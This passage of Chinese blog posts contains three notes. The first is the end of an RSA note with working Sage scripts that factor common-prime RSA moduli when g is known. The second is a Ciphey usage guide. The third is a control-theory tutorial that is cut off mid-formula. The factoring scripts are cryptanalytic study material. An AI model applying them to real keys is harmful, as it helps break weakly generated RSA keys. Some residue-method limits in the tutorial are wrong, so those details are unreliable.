<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">g = <span class="number">2855372645569408464444580237486670388029956719716115953907612135874419892154982850222965560661211729647325085879529571229774148545656169021</span></span><br><span class="line">N = <span class="number">159549169988238873893531105042878385551537587717347282632324748268846735710748763722602882823022008548774298858161130258369850715542192739582830583643642436399008902770027668038725347353393047833875066622910131525247842517372845617227325882916166114361718015983671803859502931814932543107911548450229250776542101141849788751722460468073974316977656001286989710480324512919121409123619799426221232443036698458643438020098037548757403</span></span><br><span class="line">M = (N - <span class="number">1</span>) // (<span class="number">2</span> * g)</span><br><span class="line">P.&lt;a&gt; = ZZ[]</span><br><span class="line">f = <span class="number">2</span> * a ^ <span class="number">2</span> - <span class="number">2</span> * g * a + (N - <span class="number">1</span>) // (<span class="number">2</span> * g ^ <span class="number">2</span>) - <span class="number">1</span></span><br><span class="line">a = f.roots()</span><br><span class="line"><span class="keyword">if</span> a:</span><br><span class="line">    a, b = a[<span class="number">0</span>][<span class="number">0</span>], a[<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">    p = <span class="number">2</span> * g * a + <span class="number">1</span></span><br><span class="line">    q = <span class="number">2</span> * g * b + <span class="number">1</span></span><br><span class="line">    <span class="keyword">assert</span> p * q == N</span><br></pre></td></tr></table></figure>
<p>因为 <span class="math inline">\(p=2ga+1\)</span>，注意到 <span class="math inline">\(g&gt;N^{1/4}\)</span> 是已知的，故我们也可以用
<code>Coppersmith's factoring</code> 方法分解模数。</p>
<p>而当 <span class="math inline">\(g&lt;a+b\)</span>
时，我们可以使用时间复杂度为 <span class="math inline">\(O(N^{1/4-\gamma})\)</span> 的算法分解 <span class="math inline">\(N\)</span>，每个操作的多项式时间为 <span class="math inline">\(\log(N)\)</span>。</p>
<p>证明如下：</p>
<p>已知 <span class="math inline">\(g\)</span>，我们可以通过除法算法计算
<span class="math inline">\(u\)</span> 和 <span class="math inline">\(0\leq v\leq2g\)</span>，例如： <span class="math display">\[
\frac{N-1}{2g}=2gu+v
\]</span> 因为我们知道 <span class="math inline">\(N=2g(2gab+a+b)+1\)</span>，于是乎 <span class="math display">\[
a+b=v+2gc\\
ab=u-c
\]</span> 其中 <span class="math inline">\(c\)</span> 为任意整数。</p>
<p>对于任意与 <span class="math inline">\(N\)</span> 互素的整数 <span class="math inline">\(x\)</span>，我们有 <span class="math display">\[
x^{u2g}\equiv x^{ab2g+c2g}\equiv x^{c2g}\pmod{N}
\]</span> 因为 <span class="math inline">\(u=ab+c\)</span> 且 <span class="math inline">\(\lambda(N)=2gab\)</span>，所以 <span class="math inline">\(x^{2gab}\equiv 1\pmod{N}\)</span>。</p>
<p>让 <span class="math inline">\(y=x^{2g}\)</span>，我们有 <span class="math display">\[
y^u\equiv y^c\pmod{N}
\]</span> 根据这个关系，未知的 <span class="math inline">\(c\)</span>
可以用 Shanks 的小步大步法（baby-step giant-step
methodology）求解。对于某些 <span class="math inline">\(d&gt;\sqrt{c}\)</span>，我们计算得到大步为 <span class="math display">\[
y^0,y^d,y^{2d},\cdots,y^{d^2}\mod{N}
\]</span> 小步为 <span class="math display">\[
y^u,y^{u-1},y^{u-2},\cdots,y^{u-d}\mod{N}
\]</span> 在其中搜索碰撞，将会产生一个 <span class="math inline">\(r\)</span> 和 <span class="math inline">\(s\)</span> 满足： <span class="math display">\[
y^{rd}\equiv y^{u-s}\pmod{N}
\]</span> 其中 <span class="math inline">\(c=rd+s\)</span>。</p>
<p>当 <span class="math inline">\(c\)</span> 已知，我们可以计算 <span class="math inline">\(a,b\)</span>。</p>
<p>计算，排序和搜索需要 <span class="math inline">\(O(d\log(d))\)</span>
操作，其中 <span class="math inline">\(d&gt;\sqrt{c}\)</span>。</p>
<p>故使用这种算法需求 <span class="math inline">\(\gamma\)</span> 接近于
<span class="math inline">\(1/4\)</span>。</p>
<blockquote>
<p>本人多次跑这个算法，最终验证可得 <span class="math inline">\(c\)</span> 的大致范围大概率会落在 <span class="math inline">\(N^{(1/2-2\gamma)}\)</span>
的附近，取上下浮动两位大小最佳。</p>
</blockquote>
<p>Sagemath 如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.groups.generic <span class="keyword">import</span> bsgs</span><br><span class="line"></span><br><span class="line">g = <span class="number">28838314918840273611038952856252141148393903858815521699377328440901497</span></span><br><span class="line">N = <span class="number">23895816238623712091906549349650291003358466897973970818205381234024572750472476312894286233088847723906345049342176974080465940396626170377635736786780099297743807402105462746828310247313063710700453371777283064626446124365885063073122303271609231832129823571694756234973129694217982548355078107610764879363</span></span><br><span class="line">nbits = <span class="number">1024</span></span><br><span class="line">gamma = <span class="number">0.23</span></span><br><span class="line">cbits = ceil(nbits * (<span class="number">0.5</span> - <span class="number">2</span> * gamma))</span><br><span class="line"></span><br><span class="line">M = (N - <span class="number">1</span>) // (<span class="number">2</span> * g)</span><br><span class="line">u = M // (<span class="number">2</span> * g)</span><br><span class="line">v = M - <span class="number">2</span> * g * u</span><br><span class="line">GF = Zmod(N)</span><br><span class="line">x = GF.random_element()</span><br><span class="line">y = x ^ (<span class="number">2</span> * g)</span><br><span class="line"><span class="comment"># c的范围大概与N^(0.5-2*gamma)很接近</span></span><br><span class="line">c = bsgs(y, y ^ u, (<span class="built_in">int</span>(<span class="number">2</span>**(cbits-<span class="number">1</span>)), <span class="built_in">int</span>(<span class="number">2</span>**(cbits+<span class="number">1</span>))))</span><br><span class="line">ab = u - c</span><br><span class="line">apb = v + <span class="number">2</span> * g * c</span><br><span class="line">P.&lt;x&gt; = ZZ[]</span><br><span class="line">f = x ^ <span class="number">2</span> - apb * x + ab</span><br><span class="line">a = f.roots()</span><br><span class="line"><span class="keyword">if</span> a:</span><br><span class="line">    a, b = a[<span class="number">0</span>][<span class="number">0</span>], a[<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">    p = <span class="number">2</span> * g * a + <span class="number">1</span></span><br><span class="line">    q = <span class="number">2</span> * g * b + <span class="number">1</span></span><br><span class="line">    <span class="keyword">assert</span> p * q == N</span><br></pre></td></tr></table></figure>
<h3 id="分解-n-1">分解 <span class="math inline">\(N-1\)</span></h3>
<p>当 <span class="math inline">\(\gamma\)</span> 过小，即 <span class="math inline">\(g=N^\gamma\)</span> 过小时，因为已知 <span class="math inline">\(N-1=2gh\)</span>，故分解出 <span class="math inline">\(g\)</span> 是较为容易的。</p>
<p>可以使用 <code>yafu</code> 分解 <span class="math inline">\(\frac{N-1}{2}\)</span>，其中当 <span class="math inline">\(\gamma\)</span> 值约为 0.10 左右时分解迅速。</p>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>crypto</tag>
        <tag>rsa</tag>
      </tags>
  </entry>
  <entry>
    <title>ciphey 笔记</title>
    <url>//ciphey-note.html</url>
    <content><![CDATA[<h1 id="简述">简述</h1>
<p>Cipher
是一款使用自然语言处理和人工智能以及一些常识的全自动解密/解码/破解工具，它类似
<code>dcode.fr</code>（实际上该网站的服务也是基于人工智能），但 Ciphey
有着更强大的功能，例如连续解密和更高效的密文识别技术。</p>
<h2 id="特性">特性</h2>
<ul>
<li><strong>支持 30+的加密方法</strong>
例如编码（二进制，base64）和常规加密（例如 Caesar 密码，重复密钥 XOR
等） <strong><a href="https://link.zhihu.com/?target=https%3A//github.com/Ciphey/Ciphey/wiki/Supported-Ciphers">有关完整列表，请单击此处</a></strong></li>
<li><strong>具有增强搜索功能的定制人工智能（AuSearch）可以回答“使用了哪种加密技术?"</strong>
解密时间不到 3 秒</li>
<li><strong>定制的自然语言处理系统</strong> Ciphey
可以确定某些东西是否是纯文本。无论该纯文本是 JSON，CTF 标志还是英语
Ciphey，都可以在几毫秒内获得它</li>
<li><strong>多国语言支持</strong> 目前，仅有德语和英语（带有
AU，UK，CAN，USA 变体）</li>
<li><strong>支持加密和哈希</strong> 诸如 CyberChef Magic
之类的替代品则没有。</li>
<li><strong><a href="https://link.zhihu.com/?target=https%3A//github.com/Ciphey/CipheyCore">C++
核心</a></strong> 这会使整个过程变得非常快</li>
</ul>
<h2 id="安装">安装</h2>
<p>使用 pip 包管理即可，需要注意的是
<code>Python&gt;=3.7</code>（Windows 仅支持
Python3.7、Python3.8，其他平台支持 Python3.9，但暂时不支持
Python3.10）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install ciphey</span><br></pre></td></tr></table></figure>
<h1 id="用法">用法</h1>
<h2 id="参数">参数</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">选项:</span><br><span class="line">  -t, --text TEXT            您想要解密的密文。</span><br><span class="line">  -q, --quiet                减少冗长的显示,直接给结果</span><br><span class="line">  -g, --greppable            只输出答案(对于grep很有用)</span><br><span class="line">  -v, --verbose</span><br><span class="line">  -C, --checker TEXT         使用给定的检查器</span><br><span class="line">  -c, --config TEXT          使用给定的配置文件。默认为</span><br><span class="line">                             appdirs.user_config_dir(<span class="string">&#x27;ciphey&#x27;</span>,</span><br><span class="line">                             <span class="string">&#x27;ciphey&#x27;</span>)/<span class="string">&#x27;config.yml&#x27;</span></span><br><span class="line"></span><br><span class="line">  -w, --wordlist TEXT        使用给定的密码字典</span><br><span class="line">  -p, --param TEXT           将参数传递给语言检查器</span><br><span class="line">  -l, --list-params BOOLEAN  列出所选模块的参数</span><br><span class="line">  --searcher TEXT            选择要使用的搜索算法</span><br><span class="line">  -b, --bytes                强制密码使用二进制模式作为输入</span><br><span class="line">  --default-dist TEXT        设置默认的字符/字节分布</span><br><span class="line">  -m, --module PATH          从给定路径添加模块</span><br><span class="line">  -A, --appdirs              输出密码到想要的文件位置</span><br><span class="line"></span><br><span class="line">  -f, --file FILENAME</span><br><span class="line">  --<span class="built_in">help</span>                     显示此帮助消息并退出。</span><br></pre></td></tr></table></figure>
<h2 id="示例">示例</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">例如:</span><br><span class="line">    基本用法: ciphey -t <span class="string">&quot;aGVsbG8gbXkgbmFtZSBpcyBiZWU=&quot;</span></span><br></pre></td></tr></table></figure>
<p>Ciphey 会自动运算，如果不是想要的结果可以输入
<code>n</code>，继续运算，直到正确结果</p>
<h3 id="支持解密列表">支持解密列表</h3>
<blockquote>
<p>支持破解的密码列表 基本加密</p>
</blockquote>
<ul>
<li>Caesar Cipher-凯撒密码</li>
<li>ROT47（使用 ROT47 字母高达 ROT94）</li>
<li>ASCII 移位（高达 ROT127，带有完整的 ASCII 字母表）</li>
<li>Vigenère Cipher - 维吉尼亚密码</li>
<li>Affine Cipher - 仿射密码</li>
<li>Binary Substitution Cipher-二进制替换密码 (XY-Cipher)</li>
<li>Baconian Cipher -培根密码（两种变体）</li>
<li>Soundex</li>
<li>Transposition Cipher-转置密码</li>
<li>Pig Latin-猪拉丁语</li>
</ul>
<p>现代密码学</p>
<ul>
<li>Repeating-key XOR-重复键异或</li>
<li>Single XOR-单异或</li>
</ul>
<p>编码</p>
<ul>
<li>Base2（二进制）</li>
<li>Base8（八进制）</li>
<li>Base10（十进制）</li>
<li>Base16（十六进制）</li>
<li>Base32</li>
<li>Base58 比特币</li>
<li>Base58 Flickr（发布候选阶段）</li>
<li>Base58 Ripple</li>
<li>Base62</li>
<li>Base64</li>
<li>Base64 URL（发布候选阶段）</li>
<li>Base69</li>
<li>Base85</li>
<li>Z85（发布候选阶段）</li>
<li>ASCII Base85</li>
<li>Base91</li>
<li>Base65536（发布候选阶段）</li>
<li>ASCII</li>
<li>Reversed text - <strong>反转文字</strong></li>
<li>Morse Code-摩尔斯电码</li>
<li>DNA codons-DNA 密码子（释放候选阶段）</li>
<li>Atbash</li>
<li>Standard Galactic Alphabet-标准银河字母表（又名 Minecraft Enchanting
Language）</li>
<li>Leetspeak</li>
<li>Baudot ITA2</li>
<li>URL encoding-网址编码</li>
<li>SMS Multi-tap</li>
<li>DMTF（发布候选阶段）</li>
<li>A1Z26（发布候选阶段）</li>
<li>Prisoner’s Tap Code-囚犯的窃听代码</li>
<li>UUencode</li>
<li>Braille-盲文（1 级）</li>
</ul>
<p>深奥的语言 (EsoLang)</p>
<ul>
<li>Brainfuck</li>
</ul>
<p>压缩方法</p>
<ul>
<li>GZip</li>
</ul>
<p>哈希值
<strong>注意：由于我们无法控制的外部服务的一些错误，哈希现在被关闭。</strong>
Ciphey 支持 272 个哈希。</p>
<ul>
<li>MD5</li>
<li>SHA-1</li>
<li>SHA-256</li>
<li>SHA-384</li>
<li>SHA-512</li>
</ul>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>crypto</tag>
        <tag>ai</tag>
      </tags>
  </entry>
  <entry>
    <title>自动控制原理-控制系统数学模型</title>
    <url>//control-system-mathematical-model.html</url>
    <content><![CDATA[<h1 id="自动控制原理">自动控制原理</h1>
<h2 id="控制系统的数学模型">控制系统的数学模型</h2>
<p>一般来说，可以使用数学模型解决的问题普遍为线性时不变系统（定常系统）。</p>
<p>即一般只考虑微分方程为以下形式 <span class="math display">\[
a_n\frac{\mathrm{d}^nr(t)}{\mathrm{d}t^n}+a_{n-1}\frac{\mathrm{d}^{n-1}r(t)}{\mathrm{d}t^{n-1}}+\cdots+a_0r(t)=b_n\frac{\mathrm{d}^nc(t)}{\mathrm{d}t^n}+b_{n-1}\frac{\mathrm{d}^{n-1}c(t)}{\mathrm{d}t^{n-1}}+\cdots+b_0c(t)
\]</span> 其中 <span class="math inline">\(r(t)\)</span> 为输入，<span class="math inline">\(c(t)\)</span> 为输出。</p>
<blockquote>
<p>对非线性定常系统我们通常使用神经网络、机器学习的手段进行建模。</p>
</blockquote>
<h3 id="时域数学模型">时域数学模型</h3>
<h4 id="线性系统">线性系统</h4>
<h5 id="建立">建立</h5>
<ol type="1">
<li>根据系统的具体工作情况，<strong>确定系统或原部件的输入、输出变量</strong></li>
<li>从输入开始，按照信号传递顺序，依据各变量所遵循的物理（或化学）定律，<strong>写出各元件的动态方程，通常是微分方程</strong></li>
<li><strong>联立方程消去中间变量</strong>，写出关于输入、输出变量的微分方程式</li>
<li>将<strong>微分方程标准化</strong>（即写成左输出右输入的形式，构建标准微分方程）</li>
</ol>
<h5 id="r-l-c-无源网络">R-L-C 无源网络</h5>
<p>写出输入电压 <span class="math inline">\(u_\tau\)</span> 与输出电压
<span class="math inline">\(u_c\)</span> 之间的微分方程。</p>
<p><img src="/control-system-mathematical-model/R-L-C 无源网络.png" alt="R-L-C 无源网络" style="zoom:150%;"></p>
<p>由<strong>基尔霍夫定律</strong>写出电路的电压平衡方程： <span class="math display">\[
u_{r}(t)=L \frac{\mathrm{d} i(t)}{\mathrm{d} t}+R i(t)+u_{c}(t)
\]</span> 可知 <span class="math display">\[
i(t)=C\frac{\mathrm{d}u_c(t)}{\mathrm{d}t}
\]</span> 联立后消去中间变量 <span class="math inline">\(i(t)\)</span>
可得： <span class="math display">\[
LC\frac{\mathrm{d}^{2} u_{c}(t)}{\mathrm{d} t^{2}}+RC\frac{\mathrm{d}
u_{c}(t)}{\mathrm{d} t}+u_{c}(t)=u_{r}(t)
\]</span> 可知最终表达式为二阶线性常系数微分方程。</p>
<h5 id="弹簧-质量-阻尼器系统">弹簧-质量-阻尼器系统</h5>
<p><span class="math inline">\(K\)</span> 为弹簧的弹性系数，<span class="math inline">\(f\)</span> 为阻尼器的阻尼系数，<span class="math inline">\(m\)</span>
表示小车质量。忽略小车与地面的摩擦，写出输入外力 <span class="math inline">\(F(t)\)</span> 与输出位移 <span class="math inline">\(y(t)\)</span> 的系统微分方程。</p>
<figure>
<img src="/control-system-mathematical-model/弹簧-质量-阻尼器系统.png" alt="弹簧-质量-阻尼器系统">
<figcaption aria-hidden="true">弹簧-质量-阻尼器系统</figcaption>
</figure>
<p>受力分析得：</p>
<figure>
<img src="/control-system-mathematical-model/小车受力图.png" alt="小车受力图">
<figcaption aria-hidden="true">小车受力图</figcaption>
</figure>
<p>由<strong>牛顿第二定律</strong>可得： <span class="math display">\[
F(t)-f \frac{\mathrm{d} y(t)}{\mathrm{d} t}-K y(t)=m
\frac{\mathrm{d}^{2} y(t)}{\mathrm{d} t^{2}}
\]</span> 整理可得： <span class="math display">\[
\frac{\mathrm{d}^{2} y(t)}{\mathrm{d} t^{2}}+\frac{f}{m}
\frac{\mathrm{d} y(t)}{\mathrm{d} t}+\frac{K}{m} y(t)=\frac{F(t)}{m}
\]</span> 可知最终表达式为二阶线性常系数微分方程。</p>
<h5 id="直流电动机转速闭环控制系统">直流电动机转速闭环控制系统</h5>
<p>取给定电压 <span class="math inline">\(u_r(t)\)</span> 为输入量，转速
<span class="math inline">\(\omega(t)\)</span> 为输出量。</p>
<figure>
<img src="/control-system-mathematical-model/直流电动机转速闭环控制系统原理图.png" alt="直流电动机转速闭环控制系统原理图">
<figcaption aria-hidden="true">直流电动机转速闭环控制系统原理图</figcaption>
</figure>
<p>从产生偏差的元件开始，按<strong>信号流动方向</strong>依次写出回路中各元件的微分方程。</p>
<p>（1）测量元件</p>
<p>测速发电机（图中以 TG 标注）作为测量元件，将系统输出角速度 <span class="math inline">\(\omega(t)\)</span> 转换成相应的电压 <span class="math inline">\(u_f(t)\)</span> 进行反馈，有 <span class="math display">\[
u_f(t)=K_t\omega(t)
\]</span> 其中，<span class="math inline">\(K_t\)</span>
是测速发电机的传递函数。</p>
<p>（2）比较电路</p>
<p>比较电路的作用是将测速发电机的反馈电压 <span class="math inline">\(u_f(t)\)</span> 与给定电压 <span class="math inline">\(u_r(t)\)</span> 进行比较，产生偏差电压 <span class="math inline">\(u_e(t)\)</span>，即 <span class="math display">\[
u_e(t)=u_r(t)-u_f(t)
\]</span> （3）放大部件</p>
<p>包括两级运算放大器喝一级功率放大器，用于放大偏差电压 <span class="math inline">\(u_e(t)\)</span>，各级放大器方程分别为</p>
<ul>
<li><p>第一级放大器： <span class="math display">\[
u_{1}(t)=\frac{R_{2}}{R_{1}} u_{e}(t)
\]</span></p></li>
<li><p>第二级放大器： <span class="math display">\[
u_{2}(t)=\frac{R_{4}}{R_{3}} u_{1}(t)
\]</span></p></li>
<li><p>功率放大器： <span class="math display">\[
u_{a}(t)=K_{3} u_{2}(t)
\]</span></p></li>
</ul>
<p>不妨简写成 <span class="math display">\[
u_a(t)=K_Au_e(t)
\]</span> 其中 <span class="math display">\[
K_{A}=\frac{R_{2} R_{4}}{R_{1} R_{3}} K_{3}
\]</span> （4）直流发电机</p>
<p>直流发电机将电枢电压 <span class="math inline">\(u_a(t)\)</span>
转换成电动机转子轴的角速度 <span class="math inline">\(\omega_m(t)\)</span>，即 <span class="math display">\[
T_{m} \frac{\mathrm{d} \omega_{m}(t)}{\mathrm{d} t}+\omega_{m}(t)=K_{a}
u_{a}(t)
\]</span> （5）减速器</p>
<p>用于降低发电机的输出转速，增大转矩。减速器方程为 <span class="math display">\[
\frac{\omega(t)}{\omega_m(t)}=\frac{1}{i}
\]</span> 其中，<span class="math inline">\(i\)</span>
是减速器的传动比。</p>
<p>联立以上式子，消去中间变量可得 <span class="math display">\[
\frac{\mathrm{d}\omega(t)}{\mathrm{d}t}+\frac{i+K_AK_aK_t}{T_mi}\omega(t)=\frac{K_AK_a}{T_mi}u_r(t)
\]</span> 可知最终表达式为一阶线性常系数微分方程。</p>
<h5 id="总结">总结</h5>
<p>将以上具有相同数学模型的不同物理系统称为<strong>相似系统</strong>，相似原理揭示了不同物理现象的相似关系，为控制系统的分析、设计和计算机仿真奠定了基础。</p>
<h4 id="非线性系统">非线性系统</h4>
<p>严格地说，实际系统的数学模型一般都是非线性的，例如弹簧的刚度和形变有关，不一定是常数；而电阻、电感、电容等参数值与温度、压力、电流等有关系。所以一般情况下，会将非线性系统<strong>在合理、可能的条件下</strong>简化为线性系统。</p>
<h5 id="铁芯线圈系统">铁芯线圈系统</h5>
<p>写出以电压 <span class="math inline">\(u_r\)</span> 为输入，电流
<span class="math inline">\(i\)</span>
为输出的铁芯线圈的线性化方程。</p>
<figure>
<img src="/control-system-mathematical-model/铁芯线圈.png" alt="铁芯线圈">
<figcaption aria-hidden="true">铁芯线圈</figcaption>
</figure>
<p>根据<strong>基尔霍夫定律</strong>，有 <span class="math display">\[
u_r=u_1+Ri
\]</span> 其中 <span class="math inline">\(u_1\)</span>
为线圈的感应电动势，由法拉第电磁感应效率可知 <span class="math display">\[
u_1=K_1\frac{\mathrm{d}\phi(i)}{\mathrm{d}t}=K_1\frac{\mathrm{d}\phi(i)}{\mathrm{d}i}\frac{\mathrm{d}i}{\mathrm{d}t}
\]</span> 其中 <span class="math inline">\(K_1\)</span>
为比例常数（线圈匝数）。</p>
<p>知晓磁通 <span class="math inline">\(\phi\)</span> 与电流 <span class="math inline">\(i\)</span> 不构成线性函数，可能的图如下：</p>
<figure>
<img src="/control-system-mathematical-model/磁通曲线.png" alt="磁通曲线">
<figcaption aria-hidden="true">磁通曲线</figcaption>
</figure>
<p>如果在工作范围内，仅取 <span class="math inline">\(\mathrm{d}i\)</span> 的变化，（在工作点 <span class="math inline">\((i_0,\phi_0)\)</span>）得到 <span class="math inline">\(\phi\)</span> 的近似值为 <span class="math display">\[
\phi=\phi_0+\phi&#39;(i_0)\mathrm{d}i
\]</span> 即将 <span class="math inline">\(\phi\)</span> 当作与 <span class="math inline">\(i\)</span> 的线性函数，有 <span class="math display">\[
\frac{\mathrm{d}\phi(i)}{\mathrm{d}i}=C_1=\phi&#39;(i_0)
\]</span> 整理可得 <span class="math display">\[
K_1\phi&#39;(i_0)\frac{\mathrm{d}i}{\mathrm{d}t}+Ri=u_r
\]</span> 即为一阶常系数微分方程。</p>
<h4 id="运动的模态">运动的模态</h4>
<p>线性微分方程的解由<strong>齐次方程的通解</strong>和<strong>给定信号对应的特解</strong>组成，而其中通解反映了系统自由运动的规律。</p>
<p>如果微分方程的特征根为 <span class="math inline">\(\lambda_1,\lambda_2,\cdots,\lambda_n\)</span>，且<strong>无重根</strong>，则把函数
<span class="math inline">\(e^{\lambda_1t},e^{\lambda_2t},\cdots,e^{\lambda_nt}\)</span>
称作该微分方程所描述运动的<strong>模态</strong>，也叫振态。</p>
<p>如果<strong>有重根</strong> <span class="math inline">\(\lambda\)</span>，则<strong>模态</strong>是具有
<span class="math inline">\(t^ke^{\lambda t}\)</span> 形式的函数，其中
<span class="math inline">\(k\in\Z^*\)</span> （具体为 <span class="math inline">\(k+1\)</span> 为重根数）。</p>
<p>如果特征根中有共轭复根 <span class="math inline">\(\lambda=\sigma\pm
j\omega\)</span>，则其<strong>共轭复模态</strong>为 <span class="math inline">\(e^{(\sigma\pm
j\omega)t}\)</span>，或者是写成实函数模态 <span class="math inline">\(e^{\sigma t}\sin{\omega t},e^{\sigma t}\cos{\omega
t}\)</span>。</p>
<p>每一种模态都可以看成是线性系统自由响应最基本的运动形态，线性系统的自由响应就是其相应模态的线性组合。</p>
<h3 id="微分方程求解方法">微分方程求解方法</h3>
<h4 id="特征根法">特征根法</h4>
<p>微分方程的特征根是将方程中的 <span class="math inline">\(n\)</span>
阶导数 <span class="math inline">\(f^{(n)}(x)\)</span> 替换成 <span class="math inline">\(n\)</span> 阶多项式 <span class="math inline">\(x^n\)</span> 后的多项式方程的解。</p>
<p>例如存在二阶常系数齐次线性微分方程 <span class="math inline">\(y&#39;&#39;+py&#39;+qy=0\)</span>，特征方程为
<span class="math inline">\(x^2+px+q=0\)</span>，如果</p>
<ol type="1">
<li><span class="math inline">\(p^2-4q&gt;0\)</span>，相异实根为 <span class="math inline">\(\lambda_1,\lambda_2\)</span>，则方程有两个线性无关的解
<span class="math inline">\(y_1=e^{\lambda_1x},y_2=e^{\lambda_2x}\)</span>，通解为
<span class="math inline">\(C_1e^{\lambda_1 x}+C_2e^{\lambda_2
x}\)</span></li>
<li><span class="math inline">\(p^2-4q=0\)</span>，重根 <span class="math inline">\(\lambda=\lambda_1=\lambda_2=-\frac{p}{2}\)</span>，则方程有一个解为
<span class="math inline">\(y=xe^{\lambda x}\)</span>（另一个解为 <span class="math inline">\(y=e^{\lambda x}\)</span>），通解为 <span class="math inline">\(y=(C_1+C_2x)e^{\lambda x}\)</span></li>
<li><span class="math inline">\(p^2-4q&lt;0\)</span>，共轭复根 <span class="math inline">\(\lambda=\alpha\pm
i\beta\)</span>，则方程有两个线性无关的解 <span class="math inline">\(y_1=e^{(\alpha+i\beta)x},y_2=e^{(\alpha-i\beta)x}\)</span>，通解为
<span class="math inline">\(y=e^{\alpha x}(C_1\cos{\beta
x}+C_2\sin{\beta x})\)</span></li>
</ol>
<p>这样我们就通过特征根解得微分方程的通解。</p>
<h4 id="拉普拉斯变换">拉普拉斯变换</h4>
<p>拉普拉斯变换简称拉氏变换，是将实函数转化为 <span class="math inline">\(Re\ s&gt;0\)</span> 的复函数，定义为 <span class="math display">\[
F(s)=\int^{+\infty}_0f(t)e^{-st}dt
\]</span> 本质是将时域函数转化为等价的复域函数，简单用 <span class="math inline">\(F(s)=\mathscr{L}[f(t)]\)</span> 表示对时域函数
<span class="math inline">\(f(t)\)</span> 进行拉普拉斯变换。</p>
<p>常用的变换结果有 <span class="math display">\[
\mathscr{L}(1)=\mathscr{L}[u(t)]=\frac{1}{s}\\
\mathscr{L}(t^n)=\frac{n!}{s^{n+1}}\\
\mathscr{L}(e^{kt})=\frac{1}{s-k}\\
\mathscr{L}(t^ne^{kt})=\frac{n!}{(s-k)^{n+1}}\\
\mathscr{L}(tf(t))=(-1)\frac{\mathrm{d}}{\mathrm{d}s}f(s)=-f&#39;(s)\\
\mathscr{L}(t^nf(t))=(-1)^n\frac{\mathrm{d}^n}{\mathrm{d}s^n}f(s)=(-1)^nf^{(n)}(s)\\
\mathscr{L}(\cos{(\omega_0 t)})=\frac{s}{s^2+\omega_0^2}\\
\mathscr{L}(\sin{(\omega_0 t)})=\frac{\omega_0}{s^2+\omega_0^2}
\]</span> 由此可知，拉普拉斯变换有以下一些性质</p>
<ul>
<li><p>线性性质 <span class="math display">\[
\alpha f_1(t)\pm \beta f_2(t)\leftrightarrow \alpha F_1(s)\pm \beta
F_2(s)
\]</span></p></li>
<li><p>位移性质（复位移） <span class="math display">\[
f(t)\cdot e^{s_0t}\leftrightarrow F(s-s_0)
\]</span></p></li>
<li><p>延迟性质（时位移，一般只考虑向右平移） <span class="math display">\[
f(t-t_0)\cdot u(t-t_0)\leftrightarrow F(s)\cdot e^{-st_0}
\]</span></p></li>
<li><p>微分性质 <span class="math display">\[
f&#39;(t)\leftrightarrow sF(s)-f(0)
\]</span></p>
<blockquote>
<p>对于高阶微分，有 <span class="math display">\[
f^n(t)\leftrightarrow
s^nF(s)-s^{n-1}F(0)-s^{n-2}f&#39;(0)-\cdots-f^{n-1}(0)
\]</span></p>
</blockquote></li>
<li><p>积分性质 <span class="math display">\[
\newcommand{\diff}{\mathrm{d}}
\int^t_0f(\tau)\diff{\tau}\leftrightarrow
\frac{F(s)}{s}+\frac{f^{-1}(0)}{s}
\]</span></p></li>
</ul>
<blockquote>
<p>在这里 <span class="math inline">\(f^{-1}\)</span> 表示 <span class="math inline">\(\int f\)</span>，即对 <span class="math inline">\(f(t)\)</span> 进行积分。</p>
</blockquote>
<ul>
<li><p>初值定理 <span class="math display">\[
\lim_{t\to0}f(t)=\lim_{s\to\infty}s\cdot F(s)
\]</span></p></li>
<li><p>终值定理 <span class="math display">\[
\lim_{t\to\infty}f(t)=\lim_{s\to0}s\cdot F(s)
\]</span></p></li>
</ul>
<h4 id="拉普拉斯逆变换">拉普拉斯逆变换</h4>
<p>公式定义如下 <span class="math display">\[
\newcommand{\j}{\mathrm{j}}
f(t)=\frac{1}{2\pi\j}\int^{\sigma+\j\infty}_{\sigma-\j\infty}F(s)e^{ts}\diff{s}
\]</span> 一般我们不会使用定义法，而是将其进行裂项后用公式得结果。</p>
<p>例如 <span class="math display">\[
F(s)=\frac{1}{s(s+a)}
\]</span> 裂项后得到 <span class="math display">\[
F(s)=\frac{1}{a}\left(\frac{1}{s}-\frac{1}{s+a}\right)
\]</span> 通过公式得到 <span class="math display">\[
f(t)=\frac{1}{a}(1-e^{-at})
\]</span> 也可以使用<strong>留数法</strong>求解裂项，例如 <span class="math display">\[
F(s)=\frac{1}{s(s+1)^2}=\frac{A}{s}+\frac{B}{s+1}+\frac{C}{(s+1)^2}
\]</span></p>
<blockquote>
<p>在这里裂项后一定是每个项数都存在。</p>
</blockquote>
<p>那么 <span class="math display">\[
A=\lim_{s\to0}sF(s)=1\\
B=\lim_{s\to1}(s+1)^2F&#39;(s)=-1\\
C=\lim_{s\to1}(s+1)^2F(s)=1
\]</span> 有 <span class="math display">\[
f(t)=1-e^{-t}+te^{-t}
\]</span></p>
<h4 id="拉氏变换法">拉氏变换法</h4>
<p>例如控制系统微分方程如下 <span class="math display">\[
y&#39;&#39;(t)+2y&#39;(t)+y(t)=1(t)\\
y(0)=y&#39;(0)=0
\]</span></p>
<blockquote>
<p><span class="math inline">\(1(t)\)</span> 即阶跃信号 <span class="math inline">\(u(t)\)</span>。</p>
</blockquote>
<p>对该微分方程进行拉氏变换 <span class="math display">\[
(s^2+2s+1)Y(s)=\frac{1}{s}
\]</span></p>
<blockquote>
<p>根据微分性质，例如</p>
<p><span class="math inline">\(\mathscr{L}[y&#39;&#39;(t)]=s^2Y(s)-y&#39;(0)=s^2Y(s)\)</span></p>
</blockquote>
<p>求解得到 <span class="math display">\[
Y(s)=\frac{1}{s(s^2+2s+1)}
\]</span> 进行拉氏反变换得到 <span class="math display">\[
f(t)=1-e^{-t}+te^{-t}
\]</span></p>
<h3 id="复域数学模型">复域数学模型</h3>
<h4 id="传递函数">传递函数</h4>
<p>我们已知线性定常系统的微分方程一般可写为 <span class="math display">\[
